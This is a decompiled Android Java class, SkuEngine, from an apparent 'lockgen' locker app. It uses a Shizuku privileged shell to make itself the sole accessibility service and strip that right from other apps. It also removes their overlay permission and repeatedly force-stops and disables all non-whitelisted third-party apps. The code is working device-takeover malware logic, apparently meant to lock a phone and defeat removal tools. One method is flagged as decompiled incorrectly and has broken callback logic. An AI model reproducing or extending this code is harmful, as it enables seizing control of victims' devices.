package com.lockgen.template.app.sku;

import android.content.ComponentName;
import android.content.Context;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import com.lockgen.template.app.IShellService;
import com.lockgen.template.app.core.Cfg;
import com.lockgen.template.app.core.LockService;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONObject;
import rikka.shizuku.Shizuku;

public final class SkuEngine {
    private static final ServiceConnection CONN = new ServiceConnection() { // from class: com.lockgen.template.app.sku.SkuEngine.2
        @Override // android.content.ServiceConnection
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            SkuEngine.shell = IShellService.Stub.asInterface(iBinder);
            SkuEngine.bindRequested = false;
            Log.i(SkuEngine.TAG, "SKU 命令通道已连接");
        }

        @Override // android.content.ServiceConnection
        public void onServiceDisconnected(ComponentName componentName) {
            SkuEngine.shell = null;
            Log.w(SkuEngine.TAG, "SKU 命令通道断开");
        }
    };
    private static final int REQ_PERMISSION = 4001;
    private static final String SHIZUKU_PKG = "moe.shizuku.privileged.api";
    private static final String TAG = "SkuEngine";
    private static volatile boolean bindRequested;
    private static volatile boolean permListenerAdded;
    private static volatile IShellService shell;

    /* loaded from: /data/np/file-convert/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7.dex */
    public interface PermCallback {
        void onResult(boolean z);
    }

    private SkuEngine() {
    }

    public static boolean installed(Context context) {
        try {
            context.getPackageManager().getPackageInfo("moe.shizuku.privileged.api", 0);
            return true;
        } catch (Throwable unused) {
            return false;
        }
    }

    public static boolean binderAlive() {
        try {
            return Shizuku.pingBinder();
        } catch (Throwable unused) {
            return false;
        }
    }

    public static boolean authorized() {
        try {
            if (binderAlive()) {
                return Shizuku.checkSelfPermission() == 0;
            }
            return false;
        } catch (Throwable unused) {
            return false;
        }
    }

    public static boolean available(Context context) {
        return installed(context) && binderAlive();
    }

    public static boolean channelReady() {
        return shell != null;
    }

    /* JADX WARN: Removed duplicated region for block: B:25:0x004f  */
    /* JADX WARN: Removed duplicated region for block: B:34:? A[RETURN, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void requestPermission(final Context context, PermCallback permCallback) {
        final PermCallback permCallback2;
        Throwable th;
        if (authorized()) {
            if (permCallback != null) {
                permCallback.onResult(true);
                return;
            }
            return;
        }
        try {
            if (!permListenerAdded) {
                try {
                    permListenerAdded = true;
                    Shizuku.addRequestPermissionResultListener(new Shizuku.OnRequestPermissionResultListener() { // from class: com.lockgen.template.app.sku.SkuEngine$$ExternalSyntheticLambda0
                        @Override // rikka.shizuku.Shizuku.OnRequestPermissionResultListener
                        public final void onRequestPermissionResult(int i, int i2) {
                            SkuEngine.lambda$requestPermission$0(context, i, i2);
                        }
                    });
                } catch (Throwable th2) {
                    th = th2;
                    permCallback2 = permCallback;
                    Log.w(TAG, "申请 SKU 授权失败", th);
                    if (permCallback2 == null) {
                    }
                }
            }
            Shizuku.requestPermission(REQ_PERMISSION);
            final Handler handler = new Handler(Looper.getMainLooper());
            final long currentTimeMillis = System.currentTimeMillis() + 8000;
            permCallback2 = permCallback;
            try {
                handler.post(new Runnable() { // from class: com.lockgen.template.app.sku.SkuEngine.1
                    @Override // java.lang.Runnable
                    public void run() {
                        if (SkuEngine.authorized()) {
                            SkuEngine.ensureChannel(context);
                            PermCallback permCallback3 = permCallback2;
                            if (permCallback3 != null) {
                                permCallback3.onResult(true);
                            }
                        } else if (System.currentTimeMillis() < currentTimeMillis) {
                            handler.postDelayed(this, 600L);
                        } else {
                            PermCallback permCallback4 = permCallback2;
                            if (permCallback4 != null) {
                                permCallback4.onResult(false);
                            }
                        }
                    }
                });
            } catch (Throwable th3) {
                th = th3;
                th = th;
                Log.w(TAG, "申请 SKU 授权失败", th);
                if (permCallback2 == null) {
                    permCallback2.onResult(false);
                }
            }
        } catch (Throwable th4) {
            th = th4;
            permCallback2 = permCallback;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void lambda$requestPermission$0(Context context, int i, int i2) {
        boolean z = i2 == 0;
        Log.i(TAG, "授权回调 code=" + i + " granted=" + z);
        if (z) {
            ensureChannel(context);
        }
    }

    public static void ensureChannel(Context context) {
        if (shell == null && !bindRequested && authorized()) {
            bindRequested = true;
            try {
                Shizuku.bindUserService(new Shizuku.UserServiceArgs(new ComponentName(context.getPackageName(), SkuShellBinder.class.getName())).daemon(false).processNameSuffix("shell").debuggable(false).version(1), CONN);
                Log.i(TAG, "已请求绑定 SKU 命令通道");
            } catch (Throwable th) {
                bindRequested = false;
                Log.w(TAG, "绑定 UserService 失败", th);
            }
        }
    }

    public static String sh(String str) {
        IShellService iShellService = shell;
        if (iShellService == null) {
            return null;
        }
        try {
            return iShellService.exec(str);
        } catch (Throwable th) {
            Log.w(TAG, "命令执行失败: " + str, th);
            return null;
        }
    }

    public static String selfComponent(Context context) {
        return context.getPackageName() + "/" + LockService.class.getName();
    }

    public static void applyInitial(Context context, JSONObject jSONObject) {
        if (shell == null) {
            return;
        }
        Log.i(TAG, "开始执行 SKU 开局动作");
        if (Cfg.b(jSONObject, "autoEnableA11y", true)) {
            enableSelf(context);
            Log.i(TAG, "已自动写入无障碍设置");
        }
        if (Cfg.b(jSONObject, "stripA11y", true)) {
            stripOthers(context);
        }
        if (Cfg.b(jSONObject, "killAll", true)) {
            suppressOthers(context, jSONObject);
        }
        Log.i(TAG, "SKU 开局动作完成");
    }

    public static void suppressOthers(Context context, JSONObject jSONObject) {
        String[] split;
        int max = Math.max(1, Cfg.i(jSONObject, "killRounds", 3));
        int max2 = Math.max(200, Cfg.i(jSONObject, "killGap", 800));
        boolean b = Cfg.b(jSONObject, "freezeOthers", true);
        boolean b2 = Cfg.b(jSONObject, "stripOverlay", true);
        String packageName = context.getPackageName();
        Set<String> whiteSet = whiteSet(jSONObject);
        Log.i(TAG, "开始压制: 轮次=" + max + " 冻结=" + b + " 摘悬浮窗=" + b2);
        for (int i = 0; i < max; i++) {
            String sh = sh("pm list packages -3");
            if (sh == null) {
                return;
            }
            for (String str : sh.split("\n")) {
                if (str.startsWith("package:")) {
                    String trim = str.substring(8).trim();
                    if (!trim.isEmpty() && !trim.equals(packageName) && !whiteSet.contains(trim)) {
                        suppressOne(trim, b, b2);
                    }
                }
            }
            if (i < max - 1 && !sleepQuietly(max2)) {
                return;
            }
        }
        Log.i(TAG, "压制完成");
    }

    public static void suppressOne(String str, boolean z, boolean z2) {
        sh("cmd appops set " + str + " BIND_ACCESSIBILITY_SERVICE ignore");
        if (z2) {
            sh("cmd appops set " + str + " SYSTEM_ALERT_WINDOW ignore");
        }
        sh("am force-stop " + str);
        if (z) {
            sh("pm disable-user --user 0 " + str);
        }
    }

    public static Set<String> whiteSet(JSONObject jSONObject) {
        HashSet hashSet = new HashSet();
        JSONArray arr = Cfg.arr(jSONObject, "killWhite");
        for (int i = 0; i < arr.length(); i++) {
            String trim = arr.optString(i, "").trim();
            if (!trim.isEmpty()) {
                hashSet.add(trim);
            }
        }
        return hashSet;
    }

    private static boolean sleepQuietly(long j) {
        try {
            Thread.sleep(j);
            return true;
        } catch (InterruptedException unused) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    public static void enableSelf(Context context) {
        String packageName = context.getPackageName();
        String selfComponent = selfComponent(context);
        sh("cmd appops set " + packageName + " BIND_ACCESSIBILITY_SERVICE allow");
        sh("settings put secure enabled_accessibility_services \"" + selfComponent + "\"");
        sh("settings put secure accessibility_enabled 1");
    }

    private static void stripOthers(Context context) {
        String sh = sh("settings get secure enabled_accessibility_services");
        if (sh == null) {
            return;
        }
        String packageName = context.getPackageName();
        for (String str : parseComponents(sh)) {
            if (!str.equals(packageName)) {
                sh("cmd appops set " + str + " BIND_ACCESSIBILITY_SERVICE ignore");
            }
        }
        sh("settings put secure enabled_accessibility_services \"" + selfComponent(context) + "\"");
        sh("settings put secure accessibility_enabled 1");
    }

    private static void killOthers(Context context, JSONObject jSONObject) {
        String[] split;
        int max = Math.max(1, Cfg.i(jSONObject, "killRounds", 3));
        int max2 = Math.max(200, Cfg.i(jSONObject, "killGap", 800));
        String packageName = context.getPackageName();
        HashSet hashSet = new HashSet();
        JSONArray arr = Cfg.arr(jSONObject, "killWhite");
        for (int i = 0; i < arr.length(); i++) {
            String trim = arr.optString(i, "").trim();
            if (!trim.isEmpty()) {
                hashSet.add(trim);
            }
        }
        for (int i2 = 0; i2 < max; i2++) {
            String sh = sh("pm list packages -3");
            if (sh == null) {
                return;
            }
            for (String str : sh.split("\n")) {
                if (str.startsWith("package:")) {
                    String trim2 = str.substring(8).trim();
                    if (!trim2.isEmpty() && !trim2.equals(packageName) && !hashSet.contains(trim2)) {
                        sh("am force-stop " + trim2);
                    }
                }
            }
            if (i2 < max - 1) {
                try {
                    Thread.sleep(max2);
                } catch (InterruptedException unused) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }

    public static boolean selfA11yAlive(Context context) {
        String sh = sh("settings get secure enabled_accessibility_services");
        if (sh == null) {
            return true;
        }
        return sh.contains(context.getPackageName() + "/");
    }

    public static void restore(Context context) {
        enableSelf(context);
    }

    private static Set<String> parseComponents(String str) {
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        if (str != null) {
            for (String str2 : str.split(":")) {
                String trim = str2.trim();
                int indexOf = trim.indexOf(47);
                if (indexOf > 0) {
                    trim = trim.substring(0, indexOf);
                }
                String trim2 = trim.trim();
                if (!trim2.isEmpty() && trim2.contains(".")) {
                    linkedHashSet.add(trim2);
                }
            }
        }
        return linkedHashSet;
    }
}